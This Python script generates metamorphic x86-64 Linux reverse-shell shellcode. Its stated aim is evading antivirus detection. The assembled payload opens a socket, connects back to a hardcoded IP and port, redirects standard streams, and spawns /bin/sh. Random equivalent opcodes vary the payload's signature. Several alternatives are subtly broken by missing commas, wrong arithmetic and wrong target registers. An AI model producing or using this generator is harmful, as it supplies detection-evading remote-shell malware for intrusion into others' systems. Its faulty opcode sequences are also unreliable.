import random 

# The goal of this python code is to generate a metamorfic shellcode
# that will be able to bypass antivirus detection.
# The code is based on the following article:
# http://meri.edu.in/journal/wp-content/uploads/2019/01/Paper-4-OCT-17.pdf


# TODO : 
# - Create a function to let the user choose IP address and port number (input + conversion to hex + conversion to little endian)
# - Develop the function mov_rsp_in_stack()
# - Develop the function sub_rsp_value()
# - develop the function mov_dil_6(), and rename it to mov_dil_value()



###################################################
#################### FUNCTIONS ####################
###################################################


################################################### XOR REGISTER ###################################################

def xor_rax():
    l = [r"\x48\x31\xc0", # xor rax, rax
        r"\x4D\x31\xC0\x4C\x89\xC0", # xor r8, r8 - mov rax, r8
        r"\xB0\x01\x2C\x01",  # mov al, 0x1 - sub al, 0x1
        ]
    return random.choice(l)
    
def xor_rbx():
    l = [r"\x48\x31\xdb", # xor rbx, rbx
        r"\x4D\x31\xC0\x4C\x89\xC3", # xor r8, r8 - mov rbx, r8
        r"\xB3\x01\x80\xEB\x01",  # mov bl, 0x1 - sub bl, 0x1
        ]
    return random.choice(l)

def xor_rcx():
    l = [r"\x48\x31\xc9", # xor rcx, rcx
        r"\x4D\x31\xC0\x4C\x89\xC1", # xor r8, r8 - mov rcx, r8
        r"\xB1\x01\x80\xE9\x01",  # mov cl, 0x1 - sub cl, 0x1
        ]
    return random.choice(l)

def xor_rdx():
    l = [r"\x48\x31\xd2", # xor rdx, rdx
        r"\x4D\x31\xC0\x4C\x89\xC2", # xor r8, r8 - mov rdx, r8
        r"\xB2\x01\x80\xEA\x01",  # mov dl, 0x1 - sub dl, 0x1
        ]
    return random.choice(l)

def xor_rsi():
    l = [r"\x48\x31\xf6", # xor rsi, rsi
        r"\x4D\x31\xC0\x4C\x89\xC6", # xor r8, r8 - mov rsi, r8
        r"\x40\xB6\x01\x40\x80\xEE\x01",  # mov sil, 0x1 - sub sil, 0x1
        ]
    return random.choice(l)

def xor_rdi():
    l = [r"\x48\x31\xff", # xor rdi, rdi
        r"\x4D\x31\xC0\x4C\x89\xC7", # xor r8, r8 - mov rdi, r8
        r"\x40\xB7\x01\x40\x80\xEF\x01",  # mov dil, 0x1 - sub dil, 0x1
        ]
    return random.choice(l)


################################################### STATIC MOVES ###################################################

def mov_r8_rax():
    l = [r"\x4C\x89\xc0", # mov r8, rax
        r"\x4D\x31\xFF\x49\x89\xC7\x4D\x89\xF8" # xor r15, r15 - mov r15, rax - mov r8, r15
        r"\x4D\x31\xC9\x49\x89\xC1\x4D\x89\xC8" # xor r9, r9 - mov r9, rax - mov r8, r9
        ]
    return random.choice(l)

def mov_rsi_rsp() : 
    l = [ r"\x48\x89\xE6", # mov rsi, rsp
        r"\x4D\x31\xFF\x49\x89\xE7\x4C\x89\xFE", # xor r15, r15 - mov r15, rsp - mov rsi, r15
        r"\x4D\x31\xC9\x49\x89\xE1\x4C\x89\xCE" # xor r9, r9 - mov r9, rsp - mov rsi, r9
        ]
    return random.choice(l)

# TODO : create a dynamic function that will generate the mov rsp, value instruction   
# for the moment, the function is static and the value is fixed to 8
# it's only dynamic for the 1st alternative. 
def sub_rsp_value(value) : 
    l = [ r"\x48\x83\xEC" + dec_to_hex(value), # sub rsp, value
        r"\x4D\x31\xFF\x41\xB7\x08\x44\x28\xFC", # xor r15, r15 - mov r15b, 8 - sub rsp, r15b
        r"\x4D\x31\xC9\x41\xB1\x08\x44\x28\xCC" # xor r9, r9 - mov r9b, 8 - sub rsp, r9b
        ]
    return random.choice(l)

#TODO : You have to change the value of the IP address
def mov_rsp_in_stack(value) :
    if value == "rsp" : 
        return r"\x66\xC7\x04\x24\x02\x00"
    elif value == "rsp+0x2" :
        return r"\x66\xC7\x44\x24\x02\x11\x5C"
    elif value == "rsp+0x4" :
        return r"\xC7\x44\x24\x04\xC0\xA8\x2D\x80" 

# TODO : create a dynamic function that will generate the mov rdi, value instruction   
def mov_dil_6() :
    l = [ r"\x40\xB7\x06", # mov dil, 0x6
        r"\x4D\x31\xC9\x41\xB1\x06\x44\x88\xCF", # xor r9, r9 - mov r9b, 6 - mov dil, r9b
        r"\x4D\x31\xFF\x41\xB7\x06\x44\x88\xFF" # xor r15, r15 - mov r15b, 6 - mov dil, r15b
        ]
    return random.choice(l)   
################################################### CONVERSIONS FUNCTIONS ###################################################    

def dec_to_hex(dec):
    hex_value = hex(dec)[2:]  # Convert to hexadecimal and remove '0x' prefix
    if len(hex_value) == 1:
        hex_value = "0" + hex_value
    return hex_value


################################################### DYNAMIC FUNCTIONS ###################################################
# DYNAMIC AL (RAX) register
def mov_al_value(value):
    l= [  r"\xB0\x" + dec_to_hex(value), # mov al syscall_number
    r"\xB0\x" + dec_to_hex(value-1) + r"\x04\x01", # mov al syscall_number - 1  \n  add al, 0x1   
    r"\xB0\x" + dec_to_hex(value+1) + r"\x2C\x01" # mov al syscall_number + 1  \n  sub al, 0x1
    ]
    return random.choice(l)
    
    # mov al == \xB0
    # add al == \x04
    # sub al == \x2C
    
# DYNAMIC DL (rdx) register
def mov_dl_value(value) :
    l = [ r"\xB2\x" + dec_to_hex(value), # mov dl syscall_number
    r"\xB2\x" + dec_to_hex(value-1) + r"\x80\xEA\x01", # mov dl value - 1  \n  sub dl, 0x1
    r"\xB2\x" + dec_to_hex(value+1) + r"\x80\xEA\x01" # mov dl value + 1  \n  sub dl, 0x1
    ]
    return random.choice(l)
    # mov dl == \xB2
    # add dl == \x80\xEA\x01
    # sub dl == \x80\xEA\x01 


def mov_rdi_r8() : 
    l = [ r"\x4C\x89\xC7", # mov rdi, r8
        r"\x4D\x31\xFF\x4D\x89\xC7\x4C\x89\xFF" # xor r15, r15 - mov r15, r8 - mov rdi, r15
        r"\x4D\x31\xC9\x4D\x89\xC1\x4C\x89\xCF" # xor r9, r9 - mov r9, r8 - mov rdi, r9
        ]
    return random.choice(l)


################################################### MOV SIL VALUE ###################################################
# This function is used for the dup2 and socket syscalls, 1 for stdout and 2 for stderr and for the SOCK_STREAM type (TCP = 1).

def mov_sil_value(x) : 
    if x == 1 : 
        l = [ r"\x40\xB6\x01", # mov sil, 0x1
            r"\x4D\x31\xC9\x41\xB1\x01\x44\x88\xCE", # xor r9, r9 - mov r9b, 1 - mov sil, r9b
            r"\x4D\x31\xFF\x41\xB7\x01\x44\x88\xFE" # xor r15, r15 - mov r15b, 1 - mov sil, r15b
        ]
        return random.choice(l)
    elif x == 2 : 
        l = [ r"\x40\xB6\x02", # mov sil, 0x2
            r"\x4D\x31\xC9\x41\xB1\x02\x44\x88\xCE", # xor r9, r9 - mov r9b, 2 - mov sil, r9b
            r"\x4D\x31\xFF\x41\xB7\x02\x44\x88\xFE" # xor r15, r15 - mov r15b, 2 - mov sil, r15b
        ]
        return random.choice(l)



################################################### PUSH POP REGISTER ###################################################
# The goal of this function is to generate the shellcode that will push or pop a register
# TODO (to complete the function) add other alternatives opcodes for the push and pop registers.

def push_register(register_name) :
    if register_name == "rax" : 
        return r"\x50" 
    elif register_name == "rbx" :
        return r"\x53"
    elif register_name == "rcx" :
        return r"\x51"
    elif register_name == "rdx" :
        return r"\x52"
    elif register_name == "rsi" :
        return r"\x56"
    elif register_name == "rsp" :
        return r"\x54"
    elif register_name == "rdi" :
        return r"\x57"
    elif register_name == "r8" :
        return r"\x41\x50"
    
def pop_register(register_name) :
    if register_name == "rax" : 
        return r"\x58" 
    elif register_name == "rbx" :
        return r"\x5B"
    elif register_name == "rcx" :
        return r"\x59"
    elif register_name == "rdx" :
        return r"\x5A"
    elif register_name == "rsp" :
        return r"\x5C"
    elif register_name == "rsi" :
        return r"\x5E"
    elif register_name == "rdi" :
        return r"\x5F"
    elif register_name == "r8" :
        return r"\x41\x58"

################################################### MOV RDI, /bin/sh ###################################################

def mov_rdi_bin_sh() :
    l = [ r"\x48\xBF\x2F\x62\x69\x6E\x2F\x2F\x73\x68", # mov rdi, 0x68732f2f6e69622f
    r"\x4D\x31\xFF\x49\xBF\x2F\x2F\x62\x69\x6E\x2F\x73\x68\x4C\x89\xFB", # xor r15, r15 - mov r15, 0x68732f2f6e69622f - mov rdi, r15
    r"\x4D\x31\xC9\x49\xB9\x2F\x2F\x62\x69\x6E\x2F\x73\x68\x4C\x89\xCB" # xor r9, r9 - mov r9, 0x68732f2f6e69622f - mov rdi, r9
    ]
    return random.choice(l)

################################################### CDQ ###################################################   

def cdq() : 
    return r"\x99" # cdq
    

################################################### SYSCALL ###################################################

def syscall() :
    return r"\x0F\x05" # syscall

################################################### SHELLCODE GENERATION ###################################################
def generate_shellcode() :
    shellcode = ""
    shellcode += xor_rax()
    shellcode += xor_rbx()
    shellcode += xor_rcx()
    shellcode += xor_rdx()
    shellcode += xor_rdi()
    shellcode += xor_rsi()
    shellcode += mov_al_value(41)
    shellcode += mov_dil_6()
    shellcode += mov_sil_value(1)
    shellcode += syscall()
    shellcode += mov_r8_rax() 
    shellcode += sub_rsp_value(8)
    shellcode += mov_rsp_in_stack("rsp")
    shellcode += mov_rsp_in_stack("rsp+0x2")
    shellcode += mov_rsp_in_stack("rsp+0x4")
    shellcode += mov_rsi_rsp()
    shellcode += mov_dl_value(16)
    shellcode += push_register("r8")
    shellcode += pop_register("rdi")
    shellcode += mov_al_value(42)
    shellcode += syscall()
    shellcode += mov_al_value(33)
    shellcode += mov_rdi_r8()
    shellcode += xor_rsi()
    shellcode += syscall()
    shellcode += mov_al_value(33)
    shellcode += mov_rdi_r8()
    shellcode += xor_rsi()
    shellcode += mov_sil_value(1)
    shellcode += syscall()
    shellcode += mov_al_value(33)
    shellcode += mov_rdi_r8()
    shellcode += xor_rsi()
    shellcode += mov_sil_value(2)
    shellcode += syscall()
    shellcode += xor_rsi()
    shellcode += push_register("rsi")
    shellcode += mov_rdi_bin_sh()
    shellcode += push_register("rdi")
    shellcode += push_register("rsp")
    shellcode += pop_register("rdi")
    shellcode += mov_al_value(59)
    shellcode += cdq()
    shellcode += syscall()
    shellcode += xor_rax()
    shellcode += mov_al_value(60)
    shellcode += xor_rdi()
    shellcode += syscall()
    return shellcode

print(generate_shellcode())




